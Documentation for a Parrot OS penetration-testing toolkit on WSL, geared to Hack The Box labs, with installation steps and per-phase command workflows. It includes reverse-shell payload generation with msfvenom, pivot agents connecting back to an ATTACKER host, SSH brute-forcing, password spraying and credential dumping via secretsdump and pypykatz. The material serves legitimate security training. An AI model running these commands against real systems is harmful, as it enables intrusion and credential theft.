# Parrot WSL Security Toolkit — Full Documentation

Complete reference guide for the Parrot WSL Security Toolkit. Covers installation, GUI setup, all 100+ tools organized by pentest phase, and WSL-specific configuration.

---

## Table of Contents

- [Installation](#installation)
- [GUI Desktop Setup](#gui-desktop-setup)
- [WSL Configuration](#wsl-configuration)
- [Phase 1: Reconnaissance](#phase-1-reconnaissance)
- [Phase 2: Scanning & Enumeration](#phase-2-scanning--enumeration)
- [Phase 3: Vulnerability Analysis](#phase-3-vulnerability-analysis)
- [Phase 4: Web Application Testing](#phase-4-web-application-testing)
- [Phase 5: Exploitation](#phase-5-exploitation)
- [Phase 6: Password Attacks](#phase-6-password-attacks)
- [Phase 7: Post-Exploitation](#phase-7-post-exploitation)
- [Phase 8: Reverse Engineering](#phase-8-reverse-engineering)
- [Phase 9: Forensics & Steganography](#phase-9-forensics--steganography)
- [Phase 10: Wireless](#phase-10-wireless)
- [Phase 11: Networking Utilities](#phase-11-networking-utilities)
- [Recommended Workflow for HTB](#recommended-workflow-for-htb)
- [Workspace Setup](#workspace-setup)
- [HTB Connect (VPN)](#htb-connect-vpn)
- [Login Banner (MOTD)](#login-banner-motd)
- [Shell Aliases](#shell-aliases)
- [Browser Bookmarks](#browser-bookmarks)
- [Per-Project Command History](#per-project-command-history)
- [Troubleshooting](#troubleshooting)
- [Linux Filesystem Reference](#linux-filesystem-reference)
- [Windows Filesystem Reference](#windows-filesystem-reference)

---

## Installation

### Prerequisites

| Requirement | Details |
|-------------|---------|
| OS | Windows 10 (Build 19041+) or Windows 11 |
| WSL | Version 2 (WSL2) |
| Distro | [Parrot OS](https://parrotsec.org/docs/installation/install-with-wsl/) or Debian upgraded to Parrot |
| Disk space | ~15-20 GB free |
| RAM | 4 GB minimum, 8 GB recommended |

### Step-by-Step Install

```bash
# 1. Clone the repository
git clone --depth 1 https://github.com/NewLouwa/WSL-Parrot-Security.git
cd WSL-Parrot-Security

# 2. Install all tools + GUI
sudo bash install-toolkit.sh

# 3. Set up your user and workspace
sudo bash wsl-config/setup-user.sh <your-username>

# 4. Restart WSL (from PowerShell)
# wsl --shutdown
```

The installer will:
- Update the system
- Install XFCE4 desktop environment with XRDP
- Install all security tools organized by phase
- Configure WSL-specific settings
- Download additional tools to `/opt/htb-toolkit/`
- Create helper scripts (`start-desktop`, `fix-wsl-gui`)

### Install Log

Everything the installer prints is also written to a log file:

```
/var/log/parrot-toolkit-install.log
```

If something fails and you want to check what happened:

```bash
cat /var/log/parrot-toolkit-install.log

# Or search for warnings/failures specifically
grep -E "\[!\]|\[-\]" /var/log/parrot-toolkit-install.log
```

The summary at the end of the install also lists every package that failed so you know exactly what to fix manually.

### Windows Desktop Shortcut

The installer creates a `Parrot HTB Toolkit.bat` shortcut on your Windows Desktop automatically — this happens at the very start of the install, before anything else, so it's there even if the rest fails halfway.

Double-click it from Windows to open WSL directly. It'll use Windows Terminal if you have it installed, plain WSL otherwise.

### WSL Start Directory

By default, opening WSL from Windows drops you into `/mnt/c/Users/YourName` — your Windows profile mounted in Linux. Not useful.

The installer patches `/root/.bashrc` with:

```bash
[[ "$PWD" == /mnt/* ]] && cd ~
```

Every time a bash session opens, if it landed on a Windows mount path, it jumps to home. Silent, automatic, done.

After you run `setup-user.sh` to create your regular user, the same fix is applied to that user's `.bashrc` too.

### What Gets Installed Where

| Location | Contents |
|----------|----------|
| System packages | Via `apt` — available globally |
| Python tools | Via `pip3` — available globally |
| Go tools | `~/go/bin/` |
| Manual downloads | `/opt/htb-toolkit/` (PEAS, pspy, ligolo-ng, volatility3) |
| Wordlists | `/usr/share/seclists/` and `/usr/share/wordlists/` |
| Desktop shortcuts | `/usr/share/applications/` |
| Helper scripts | `/usr/local/bin/` |

---

## GUI Desktop Setup

The toolkit installs a complete XFCE4 desktop environment with two ways to access it.

### Method 1: WSLg (Recommended)

Windows 11 with WSL2 includes WSLg, which renders Linux GUI apps directly on your Windows desktop. No setup needed — just launch any GUI tool:

```bash
wireshark
ghidra
firefox
bloodhound
```

Each app appears as a normal Windows window.

### Method 2: XRDP (Full Desktop)

For a complete Linux desktop experience (taskbar, file manager, app menu):

```bash
# Start the XRDP server
start-desktop xrdp

# Or manually
sudo service xrdp start
```

Then from Windows:
1. Open **Remote Desktop Connection** (`Win+R` → `mstsc`)
2. Connect to `localhost:3390`
3. Log in with your WSL username and password
4. You'll see the full XFCE4 desktop

### Method 3: Auto-Detect

```bash
start-desktop
```

This automatically detects WSLg or falls back to XRDP.

### GUI Troubleshooting

```bash
# Run the built-in diagnostic/fix tool
fix-wsl-gui

# Manual fixes:
# Restart WSL from PowerShell
wsl --shutdown
# Then relaunch your Parrot WSL

# Restart D-Bus
sudo service dbus restart

# Check display variables
echo $DISPLAY $WAYLAND_DISPLAY
```

---

## WSL Configuration

The installer creates `/etc/wsl.conf`:

```ini
[boot]
systemd=true          # Enable systemd (needed for many services)

[interop]
enabled=true          # Allow running Windows programs from Linux
appendWindowsPath=true

[automount]
enabled=true
options="metadata,uid=1000,gid=1000,umask=22,fmask=11"

[network]
generateResolvConf=true
```

After changes, restart WSL:
```powershell
# From PowerShell
wsl --shutdown
```

---

## Phase 1: Reconnaissance

Initial information gathering. Find attack surface before touching the target.

### Tools

| Tool | Type | Primary Use |
|------|------|-------------|
| **nmap** | CLI | Port scanning, service detection, OS fingerprinting |
| **masscan** | CLI | Ultra-fast port scanning for large ranges |
| **amass** | CLI | Subdomain enumeration and OSINT mapping |
| **dnsrecon** | CLI | DNS enumeration, zone transfers, brute-force |
| **dnsenum** | CLI | DNS information gathering |
| **fierce** | CLI | DNS recon and non-contiguous IP discovery |
| **whois** | CLI | Domain/IP registration lookups |
| **recon-ng** | CLI | Modular OSINT framework |
| **sublist3r** | CLI | Fast subdomain enumeration via search engines |
| **theHarvester** | CLI | Email, subdomain, and IP harvesting |
| **sherlock** | CLI | Find usernames across 400+ social media sites |
| **holehe** | CLI | Check if an email is registered on 100+ websites |
| **GHunt** | CLI | Google account OSINT from an email address |
| **Photon** | CLI | Web crawler that extracts URLs, emails, files |
| **SpiderFoot** | CLI/Web | Automated OSINT scanner with web dashboard |
| **shodan** | CLI | Search internet-connected devices (needs API key) |

### Typical HTB Recon Flow

```bash
# 1. Fast port scan
rustscan -a 10.10.10.x -- -sC -sV

# 2. Full nmap scan
nmap -sC -sV -p- 10.10.10.x -oN nmap_full.txt

# 3. If DNS found (port 53)
dnsrecon -d target.htb -n 10.10.10.x
dnsenum target.htb

# 4. If web found
whatweb http://10.10.10.x
```

> Detailed docs: see individual `.md` files in `01-Reconnaissance/`

---

## Phase 2: Scanning & Enumeration

Deep-dive into discovered services. Extract as much information as possible.

### Tools

| Tool | Type | Primary Use |
|------|------|-------------|
| **gobuster** | CLI | Directory/DNS/vhost brute-force |
| **ffuf** | CLI | Fast web fuzzing (dirs, params, vhosts) |
| **feroxbuster** | CLI | Recursive content discovery |
| **dirb** | CLI | Basic web directory scanning |
| **nikto** | CLI | Web server vulnerability scanning |
| **whatweb** | CLI | Web technology fingerprinting |
| **rustscan** | CLI | Fast port scanner feeding to nmap |
| **enum4linux** | CLI | Windows/SMB enumeration |
| **smbclient** | CLI | SMB share browsing and file transfer |
| **smbmap** | CLI | SMB share permission mapping |
| **rpcclient** | CLI | MS-RPC enumeration (users, groups, policies) |
| **snmpwalk/onesixtyone** | CLI | SNMP enumeration |
| **nbtscan** | CLI | NetBIOS name scanning |
| **ldapsearch** | CLI | LDAP directory queries |

### Typical HTB Enumeration Flow

```bash
# Web enumeration
ffuf -u http://10.10.10.x/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt
ffuf -u http://10.10.10.x -H "Host: FUZZ.target.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --fs <default_size>

# SMB enumeration (Windows)
smbmap -H 10.10.10.x
smbclient -L //10.10.10.x -N
enum4linux -a 10.10.10.x
rpcclient -U "" -N 10.10.10.x -c "enumdomusers"

# SNMP (if port 161 open)
onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp-onesixtyone.txt 10.10.10.x
snmpwalk -v2c -c public 10.10.10.x

# LDAP (Active Directory)
ldapsearch -x -H ldap://10.10.10.x -b "DC=target,DC=htb"
```

> Detailed docs: see individual `.md` files in `02-Scanning-Enumeration/`

---

## Phase 3: Vulnerability Analysis

Identify exploitable vulnerabilities in discovered services.

### Tools

| Tool | Type | Primary Use |
|------|------|-------------|
| **searchsploit** | CLI | Search Exploit-DB for known exploits |
| **nmap NSE scripts** | CLI | Vulnerability detection scripts |
| **lynis** | CLI | System security auditing |
| **legion** | GUI | Automated network pentest framework |

### Typical Workflow

```bash
# Search for exploits by service/version
searchsploit apache 2.4.49
searchsploit -x 12345    # examine exploit
searchsploit -m 12345    # copy to current dir

# Nmap vulnerability scripts
nmap --script vuln 10.10.10.x
nmap --script smb-vuln* -p 445 10.10.10.x
```

> Detailed docs: see individual `.md` files in `03-Vulnerability-Analysis/`

---

## Phase 4: Web Application Testing

Attack web applications for injection flaws, misconfigurations, and logic bugs.

### Tools

| Tool | Type | Primary Use |
|------|------|-------------|
| **sqlmap** | CLI | Automatic SQL injection |
| **Burp Suite** | GUI | Web proxy and testing platform |
| **OWASP ZAP** | GUI | Free web app scanner |
| **wfuzz** | CLI | Parameter and directory fuzzing |
| **WPScan** | CLI | WordPress vulnerability scanning |
| **commix** | CLI | Command injection exploitation |
| **wafw00f** | CLI | WAF detection |
| **XSStrike** | CLI | XSS detection and exploitation |

### Typical Workflow

```bash
# 1. Check for WAF
wafw00f http://target.htb

# 2. If WordPress
wpscan --url http://target.htb -e ap,u

# 3. SQL injection testing
sqlmap -u "http://target.htb/page?id=1" --batch --dbs
# Or from saved Burp request:
sqlmap -r request.txt --batch --dbs

# 4. Command injection
commix --url="http://target.htb/ping" --data="ip=127.0.0.1"

# 5. Manual testing with Burp Suite
burpsuite    # GUI proxy for intercepting and modifying requests
```

> Detailed docs: see individual `.md` files in `04-Web-Application-Testing/`

---

## Phase 5: Exploitation

Gain initial access to the target system.

### Tools

| Tool | Type | Primary Use |
|------|------|-------------|
| **Metasploit** | CLI | Exploitation framework |
| **Impacket** | CLI | Windows/AD protocol attacks |
| **Evil-WinRM** | CLI | WinRM shell for Windows |
| **CrackMapExec** | CLI | Network credential testing |
| **NetExec** | CLI | CME successor |
| **Responder** | CLI | LLMNR/NBT-NS hash capture |
| **pwncat** | CLI | Advanced reverse shell handler |

### Typical Workflow

```bash
# Catch reverse shells
rlwrap nc -lvnp 4444
# Or with pwncat (auto-upgrade)
pwncat-cs -lp 4444

# Generate payloads
msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=4444 -f exe -o rev.exe
msfvenom -p linux/x64/shell_reverse_tcp LHOST=tun0 LPORT=4444 -f elf -o rev.elf

# Windows/AD exploitation
impacket-psexec domain/admin:password@10.10.10.x
evil-winrm -i 10.10.10.x -u admin -H NTLM_HASH
crackmapexec smb 10.10.10.x -u user -p pass --shares

# Capture hashes
sudo responder -I tun0
```

> Detailed docs: see individual `.md` files in `05-Exploitation/`

---

## Phase 6: Password Attacks

Crack hashes and brute-force login services.

### Tools

| Tool | Type | Primary Use |
|------|------|-------------|
| **John the Ripper** | CLI | Hash cracking + file hash extraction |
| **hashcat** | CLI | GPU-accelerated hash cracking |
| **Hydra** | CLI | Online brute-force (SSH, HTTP, FTP...) |
| **CeWL** | CLI | Generate wordlists from websites |
| **crunch** | CLI | Pattern-based wordlist generation |
| **hash-identifier** | CLI | Identify hash types |
| **SecLists/rockyou** | Data | Pre-built wordlists |

### Typical Workflow

```bash
# 1. Identify hash type
hashid -m 'HASH_HERE'

# 2. Crack with john
john --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-md5 hashes.txt

# 3. Or with hashcat (faster with GPU)
hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt

# 4. Extract hashes from files
ssh2john id_rsa > ssh_hash.txt
zip2john secret.zip > zip_hash.txt
keepass2john database.kdbx > kp_hash.txt

# 5. Online brute-force
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.x
hydra -l admin -P rockyou.txt 10.10.10.x http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"

# 6. Generate targeted wordlist
cewl http://target.htb -d 3 -m 5 -w custom_wordlist.txt
```

### Common Hashcat Modes

| Mode | Hash Type |
|------|-----------|
| `0` | MD5 |
| `100` | SHA1 |
| `1000` | NTLM |
| `1800` | sha512crypt ($6$) |
| `3200` | bcrypt |
| `5600` | NTLMv2 |
| `13100` | Kerberoast |
| `18200` | AS-REP Roast |

> Detailed docs: see individual `.md` files in `06-Password-Attacks/`

---

## Phase 7: Post-Exploitation

Escalate privileges, maintain access, and pivot through the network.

### Tools

| Tool | Type | Primary Use |
|------|------|-------------|
| **BloodHound** | GUI | AD attack path visualization |
| **Chisel** | CLI | HTTP tunneling/pivoting |
| **Ligolo-ng** | CLI | Advanced TUN-based pivoting |
| **LinPEAS/WinPEAS** | Script | Automated privesc enumeration |
| **pspy** | CLI | Process monitoring (find cron jobs) |
| **Proxychains** | CLI | Route tools through SOCKS proxy |
| **socat** | CLI | Advanced relay and shell upgrade |
| **sshuttle** | CLI | VPN over SSH |

### Privilege Escalation Workflow

```bash
# Linux
# 1. Run LinPEAS
./linpeas.sh | tee linpeas.txt

# 2. Monitor processes for cron jobs
./pspy64

# 3. Check standard vectors
sudo -l                        # sudo permissions
find / -perm -4000 2>/dev/null # SUID binaries
cat /etc/crontab               # cron jobs
# Check GTFOBins for exploitable binaries

# Windows
# 1. Run WinPEAS
.\winpeas.exe

# 2. Check privileges
whoami /priv
whoami /groups

# 3. Check for quick wins
# SeImpersonatePrivilege → Potato attacks
# AlwaysInstallElevated → MSI installer privesc
```

### Pivoting Workflow

```bash
# Option 1: Chisel SOCKS proxy
# Attacker:
chisel server --reverse -p 8000
# Target:
./chisel client ATTACKER:8000 R:socks
# Configure: proxychains nmap -sT -Pn INTERNAL_IP

# Option 2: Ligolo-ng (recommended for complex pivots)
# Attacker:
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
./proxy -selfcert -laddr 0.0.0.0:11601
# Target:
./agent -connect ATTACKER:11601 -ignore-cert
# Then add routes and scan normally

# Option 3: sshuttle (if SSH access available)
sshuttle -r user@10.10.10.x 172.16.1.0/24
```

### Active Directory Workflow

```bash
# 1. Collect BloodHound data
bloodhound-python -u user -p pass -d domain.htb -ns 10.10.10.x -c all

# 2. Start neo4j + BloodHound
sudo neo4j console &
bloodhound
# Import .json files, run queries

# 3. Kerberoasting
impacket-GetUserSPNs domain/user:pass -dc-ip 10.10.10.x -request
hashcat -m 13100 tgs_hashes.txt rockyou.txt

# 4. AS-REP Roasting
impacket-GetNPUsers domain/ -usersfile users.txt -dc-ip 10.10.10.x -no-pass
hashcat -m 18200 asrep_hashes.txt rockyou.txt

# 5. Dump secrets (with admin)
impacket-secretsdump domain/admin:pass@10.10.10.x

# 6. Username enumeration with Kerbrute
kerbrute userenum -d domain.htb --dc 10.10.10.x /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
kerbrute passwordspray -d domain.htb --dc 10.10.10.x users.txt 'Welcome1!'

# 7. AD CS exploitation with Certipy
certipy find -u user@domain.htb -p pass -dc-ip 10.10.10.x
certipy req -u user@domain.htb -p pass -ca YOURCA -target 10.10.10.x -template VulnTemplate -upn admin@domain.htb
certipy auth -pfx admin.pfx -dc-ip 10.10.10.x

# 8. Dump credentials from memory with pypykatz
pypykatz lsa minidump lsass.dmp
pypykatz registry --sam SAM --system SYSTEM --security SECURITY
```

> Detailed docs: see individual `.md` files in `07-Post-Exploitation/`

---

## Phase 8: Reverse Engineering

Analyze binaries, debug programs, and develop exploits.

### Tools

| Tool | Type | Primary Use |
|------|------|-------------|
| **Ghidra** | GUI | Disassembly and decompilation |
| **radare2** | CLI | Binary analysis framework |
| **GDB + PEDA** | CLI | Debugging and exploit dev |
| **pwntools** | Python | Exploit development library |
| **binwalk** | CLI | Firmware/binary file extraction |
| **ltrace/strace** | CLI | Library/system call tracing |

### Typical Workflow

```bash
# 1. Quick analysis
file mystery_binary
strings mystery_binary | grep -i flag
ltrace ./mystery_binary        # may reveal strcmp with password

# 2. Deep analysis with Ghidra
ghidra                         # Import binary, auto-analyze, read decompiled code

# 3. Debug with GDB
gdb ./vuln_binary
> aaa
> break main
> run
> # Step through, examine memory

# 4. Exploit with pwntools
python3 exploit.py
```

> Detailed docs: see individual `.md` files in `08-Reverse-Engineering/`

---

## Phase 9: Forensics & Steganography

Analyze disk images, memory dumps, and files with hidden data.

### Tools

| Tool | Type | Primary Use |
|------|------|-------------|
| **foremost** | CLI | File carving from images |
| **steghide** | CLI | JPEG/BMP steganography |
| **exiftool** | CLI | File metadata analysis |
| **Volatility 3** | CLI | Memory dump forensics |
| **stegoveritas** | CLI | Multi-method stego analysis |
| **TestDisk** | CLI | Partition/file recovery |
| **hexedit/xxd** | CLI | Binary hex editing |

### Typical Workflow

```bash
# Image analysis
exiftool suspicious.jpg         # check metadata
steghide extract -sf image.jpg  # try empty password
stegoveritas image.png          # full auto analysis
binwalk image.png               # check for embedded files
strings image.jpg | grep -i flag

# Disk forensics
foremost -i disk.dd -o output/
testdisk disk.dd

# Memory forensics
cd /opt/htb-toolkit/volatility3
python3 vol.py -f memdump.raw windows.info
python3 vol.py -f memdump.raw windows.pslist
python3 vol.py -f memdump.raw windows.hashdump
python3 vol.py -f memdump.raw windows.filescan

# Hex analysis
xxd file.bin | head -20         # check magic bytes
hexedit file.bin                # edit binary data
```

> Detailed docs: see individual `.md` files in `09-Forensics-Stego/`

---

## Phase 10: Wireless

WiFi security testing tools. **Limited functionality in WSL** due to hardware access restrictions.

### Tools

| Tool | Type | Primary Use |
|------|------|-------------|
| **aircrack-ng** | CLI | WiFi auditing suite |
| **reaver** | CLI | WPS brute-force |
| **wifite** | CLI | Automated WiFi attacks |

### What Works in WSL

- **Offline cracking** of captured handshakes works fine
- **Live capture/injection** requires USB WiFi adapter passed through with `usbipd-win`
- For full wireless testing, consider a live boot USB

```bash
# Crack a captured WPA handshake (works in WSL)
aircrack-ng -w /usr/share/wordlists/rockyou.txt capture.cap
```

> Detailed docs: see individual `.md` files in `10-Wireless/`

---

## Phase 11: Networking Utilities

Essential network tools for connectivity, analysis, and quality of life.

### Tools

| Tool | Type | Primary Use |
|------|------|-------------|
| **Wireshark** | GUI | Packet capture and analysis |
| **netcat** | CLI | TCP/UDP connections, reverse shells |
| **tcpdump** | CLI | CLI packet capture |
| **tmux** | CLI | Terminal multiplexer |
| **OpenVPN** | CLI | VPN client for HTB |
| **rlwrap** | CLI | Arrow key support for shells |
| **Remmina** | GUI | RDP/VNC remote desktop client |

### Essential Setup

```bash
# Connect to HTB
sudo openvpn lab.ovpn

# Set up tmux workspace
tmux new -s htb
# Ctrl+B, % = split vertical
# Ctrl+B, " = split horizontal
# Ctrl+B, d = detach
# tmux attach -t htb = reattach

# Better reverse shell listener
rlwrap nc -lvnp 4444
```

> Detailed docs: see individual `.md` files in `11-Networking-Utilities/`

---

## Recommended Workflow for HTB

A standard approach for attacking an HTB machine:

### 1. Setup
```bash
# Connect VPN
sudo openvpn lab.ovpn

# Start tmux session
tmux new -s htb

# Add target to /etc/hosts
echo "10.10.10.x target.htb" | sudo tee -a /etc/hosts
```

### 2. Recon
```bash
# Fast scan
rustscan -a target.htb -- -sC -sV | tee recon/nmap.txt

# Full scan (background)
nmap -p- -sC -sV target.htb -oN recon/nmap_full.txt &
```

### 3. Enumerate Services
```bash
# Web
ffuf -u http://target.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt
nikto -host http://target.htb

# SMB (Windows)
smbmap -H target.htb
enum4linux -a target.htb

# Always check for vhosts
ffuf -u http://target.htb -H "Host: FUZZ.target.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --fs <size>
```

### 4. Exploit
```bash
# Search for known exploits
searchsploit <service version>

# Set up listener
rlwrap nc -lvnp 4444

# Execute exploit...
```

### 5. Stabilize Shell
```bash
# On target
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

### 6. Escalate Privileges
```bash
# Linux
./linpeas.sh
./pspy64
sudo -l

# Windows
.\winpeas.exe
whoami /priv
```

---

## Workspace Setup

The `setup-user.sh` script creates an organized workspace under your home directory to keep all HTB work structured and easy to navigate.

### Directory Structure

```
~/workspace/
├── htb/
│   ├── machines/          # One folder per HTB machine
│   ├── challenges/        # CTF challenges by category
│   ├── prolabs/           # Pro Lab notes and progress
│   ├── endgames/          # Endgame notes
│   ├── notes/             # General study notes
│   └── vpn/               # .ovpn files
├── scripts/               # Helper scripts (new-machine, new-challenge, serve)
├── tools/                 # Custom or compiled tools
├── wordlists/             # Custom wordlists
├── loot/                  # Global loot storage
└── www/                   # Files to serve to targets via HTTP
```

### Helper Scripts

**new-machine.sh** -- Create a structured folder for a new HTB machine with subdirectories for recon, exploit, loot, privesc, and screenshots, plus a pre-filled `notes.md` template. If an IP is provided, it also adds a hostname entry to `/etc/hosts`.

```bash
new-machine Lame 10.10.10.3
# Creates ~/workspace/htb/machines/Lame/{recon,exploit,loot,privesc,screenshots,notes.md}
# Adds "10.10.10.3 lame.htb" to /etc/hosts
```

**new-challenge.sh** -- Create a folder for an HTB challenge organized by category, with subdirectories for files and solution.

```bash
new-challenge crypto easy-rsa
# Creates ~/workspace/htb/challenges/crypto/easy-rsa/{files,solution,notes.md}
```

**serve.sh** -- Start a quick Python HTTP server for transferring files to targets. Defaults to port 8080 and serves from `~/workspace/www`. Shows your tun0 IP so you can copy the download URL.

```bash
serve              # Serves ~/workspace/www on port 8080
serve 80           # Serve on port 80 (requires sudo)
serve 9000 /tmp    # Serve /tmp on port 9000
```

### htb-shell Function

The `htb-shell` function starts a dedicated bash shell for a specific machine project. It changes into the machine folder, sets a custom prompt showing the machine name, and logs all commands to a `.cmd_history` file inside that folder. See [Per-Project Command History](#per-project-command-history) for details.

```bash
htb-shell Lame
# [Lame] user@parrot:~/workspace/htb/machines/Lame$
```

---

## HTB Connect (VPN)

The `htb-connect` script (`htb-connect.sh`, installed to `/usr/local/bin/htb-connect`) provides a convenient wrapper around OpenVPN for connecting to HTB labs.

### Interactive Mode

Run `htb-connect` with no arguments. It searches for `.ovpn` files in `~/workspace/htb/vpn/`, your home directory, and Windows Downloads/Desktop folders, then presents a numbered list to choose from. After connecting, it optionally pings a target IP to confirm reachability.

```bash
htb-connect
# [*] Searching for .ovpn files...
# [+] Found .ovpn files:
#   [1] /home/user/workspace/htb/vpn/lab_user.ovpn
#   [0] Enter a custom path
# Select a file [1]:
# Target machine IP (leave empty to skip ping test): 10.10.10.5
```

### One-Liner Mode

Pass the `.ovpn` file path and optionally a target IP directly:

```bash
htb-connect ~/workspace/htb/vpn/lab.ovpn 10.10.10.5
```

Windows paths are automatically converted to WSL paths:

```bash
htb-connect 'C:\Users\You\Downloads\lab.ovpn' 10.10.10.5
```

### Status and Disconnect

```bash
htb-connect --status       # Check if VPN is connected and show your IP
htb-connect --disconnect   # Kill the VPN connection
```

### Aliases

The following aliases are set up for convenience:

| Alias | Command |
|-------|---------|
| `vpn` | `htb-connect` (interactive mode) |
| `vpn-dc` | `htb-connect --disconnect` |
| `vpn-status` | `htb-connect --status` |

---

## Login Banner (MOTD)

When you open a new WSL terminal, a login banner is displayed showing a summary of the toolkit, your network status, and quick-start tips. The banner is generated by `~/.motd.sh`, which is sourced from `.bashrc` on each login.

### Disabling the Banner

Remove or comment out the following lines in `~/.bashrc`:

```bash
# Login banner — remove this line to disable
if [ -f ~/.motd.sh ]; then
    source ~/.motd.sh
fi
```

### Editing the Banner

Edit `~/.motd.sh` directly to customize what is shown at login.

---

## Shell Aliases

The following aliases are configured by `setup-user.sh` in `~/.bash_aliases` and are available in every shell session.

### Navigation

| Alias | Expands To | Description |
|-------|-----------|-------------|
| `ws` | `cd ~/workspace` | Jump to workspace root |
| `htb` | `cd ~/workspace/htb` | Jump to HTB workspace |
| `machines` | `cd ~/workspace/htb/machines` | Jump to machines folder |
| `challenges` | `cd ~/workspace/htb/challenges` | Jump to challenges folder |

### Tools and Scripts

| Alias | Expands To | Description |
|-------|-----------|-------------|
| `new-machine` | `bash ~/workspace/scripts/new-machine.sh` | Create a new machine workspace |
| `new-challenge` | `bash ~/workspace/scripts/new-challenge.sh` | Create a new challenge workspace |
| `serve` | `bash ~/workspace/scripts/serve.sh` | Start an HTTP file server |

### VPN

| Alias | Expands To | Description |
|-------|-----------|-------------|
| `vpn` | `htb-connect` | Connect to HTB VPN (interactive) |
| `vpn-dc` | `htb-connect --disconnect` | Disconnect VPN |
| `vpn-status` | `htb-connect --status` | Show VPN status |

### Networking and Pentest Shortcuts

| Alias | Expands To | Description |
|-------|-----------|-------------|
| `myip` | `ip -4 addr show tun0 ...` | Show your HTB VPN IP address |
| `rsh` | `rlwrap nc -lvnp` | Start a reverse shell listener (append port) |
| `pserv` | `python3 -m http.server` | Quick Python HTTP server |
| `clip` | `clip.exe` | Copy stdin to Windows clipboard |
| `htb-shell` | *(function)* | Start a per-project shell with command logging |

---

## Browser Bookmarks

The toolkit includes over 100 curated security bookmarks in `wsl-config/bookmarks.html`. During user setup, these bookmarks are automatically imported into both **Brave** and **Firefox** browsers.

### Bookmark Categories

- **HackTheBox** -- HTB platform, Academy, Forums
- **Knowledge Bases** -- HackTricks, PayloadsAllTheThings, LOLBAS, WADComs
- **Cheat Sheets** -- Reverse shell generators, Nmap, SQLi, XSS references
- **Vulnerability Databases** -- CVE, Exploit-DB, NVD
- **Web Testing** -- Burp Suite docs, OWASP, JWT tools
- **Active Directory** -- BloodHound, AD attack guides, Kerberos resources
- **Reverse Engineering** -- Ghidra, radare2, decompiler references
- **OSINT** -- Shodan, Censys, OSINT frameworks
- **Crypto & Encoding** -- CyberChef, dCode, hash identification
- **Forensics & Stego** -- Memory forensics, steganography tools
- **Writeups & Learning** -- IppSec, 0xdf, HTB writeup resources
- **Network & Infra** -- Pivoting guides, tunneling references
- **GitHub Repos** -- Key security tool repositories

### Manual Import

If the automatic import does not work, you can import manually from any browser:

1. Open Bookmarks Manager
2. Select **Import bookmarks from HTML file**
3. Choose `~/workspace/bookmarks.html`

---

## Per-Project Command History

The `htb-shell` function provides per-project command logging so you can review exactly what commands you ran during a machine, which is invaluable for writing reports and writeups.

### How It Works

When you run `htb-shell MachineName`, a new bash session starts that:

1. Changes into `~/workspace/htb/machines/MachineName/`
2. Sets `HISTFILE` to `~/workspace/htb/machines/MachineName/.cmd_history`
3. Sets a custom prompt showing the machine name: `[MachineName] user@parrot:~$`
4. Logs every command you type to the `.cmd_history` file in that machine's folder

### Usage

```bash
# Start a project shell
htb-shell Lame

# Work on the machine — all commands are logged
nmap -sC -sV 10.10.10.3 -oN recon/nmap.txt
ffuf -u http://10.10.10.3/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt

# Exit the project shell when done
exit

# Review your command history later
cat ~/workspace/htb/machines/Lame/.cmd_history
```

### Tips

- The machine folder must exist first. Use `new-machine MachineName IP` to create it.
- Run `htb-shell` with no arguments to see a list of available machine folders.
- The `.cmd_history` file is a standard bash history file, so you can search it with `grep`.

---

## Troubleshooting

### Common Issues

| Problem | Solution |
|---------|----------|
| GUI apps don't display | Run `fix-wsl-gui` or restart WSL (`wsl --shutdown`) |
| XRDP connection refused | `sudo service xrdp restart`, check port 3390 |
| Package not found | `sudo apt update` then retry |
| pip install fails | Add `--break-system-packages` flag |
| Hashcat no GPU | Use `--force` (CPU) or run hashcat on Windows |
| VPN doesn't connect | Check `.ovpn` file, try `sudo openvpn --config file.ovpn` |
| No tun0 interface | VPN not connected, or needs restart |
| Tool crashes in WSL | Check if it needs systemd (`systemctl` commands) |
| DNS not resolving | Check `/etc/resolv.conf`, add `nameserver 8.8.8.8` |

### Getting Help

```bash
# Most tools have built-in help
tool --help
tool -h
man tool

# Searchsploit for known issues
searchsploit <service> <version>
```

---

## Additional Resources

- [HackTheBox](https://www.hackthebox.com/) — Lab platform
- [GTFOBins](https://gtfobins.github.io/) — Unix binary exploitation
- [LOLBAS](https://lolbas-project.github.io/) — Windows binary exploitation
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) — Payload reference
- [HackTricks](https://book.hacktricks.xyz/) — Pentesting methodology wiki
- [CyberChef](https://gchq.github.io/CyberChef/) — Data encoding/decoding
- [RevShells](https://www.revshells.com/) — Reverse shell generator
- [Parrot OS Docs](https://www.parrotsec.org/docs/) — Official Parrot documentation

---

## Linux Filesystem Reference

Quick reminder of what lives where. Useful when you land on a box and need to know where to look.

### The Full Map

| Directory | What it's for |
|-----------|---------------|
| `/` | Root of everything. The top. All paths start here. |
| `/root` | Home directory for the root user. First place to check for flags on a rooted box. |
| `/home` | Home directories for regular users. `/home/username/` — check here for user flags and SSH keys. |
| `/etc` | System-wide config files. Passwords (`/etc/passwd`, `/etc/shadow`), cron jobs, SSH config, service configs. Gold mine for enumeration. |
| `/var` | Variable data — stuff that changes while the system runs. Logs in `/var/log/`, mail in `/var/mail/`, web files often in `/var/www/`. |
| `/tmp` | Temporary files. World-writable by default, no persistence on reboot. Classic spot to drop payloads and scripts. |
| `/opt` | Optional/third-party software. Non-standard tools installed by admins often live here. Worth checking. |
| `/usr` | User programs and data. Binaries in `/usr/bin/`, libraries in `/usr/lib/`, local installs in `/usr/local/`. |
| `/bin` | Essential system binaries available to all users (ls, cat, bash, etc.). |
| `/sbin` | System binaries, mostly root-only (ifconfig, iptables, etc.). |
| `/lib` | Shared libraries needed by `/bin` and `/sbin`. |
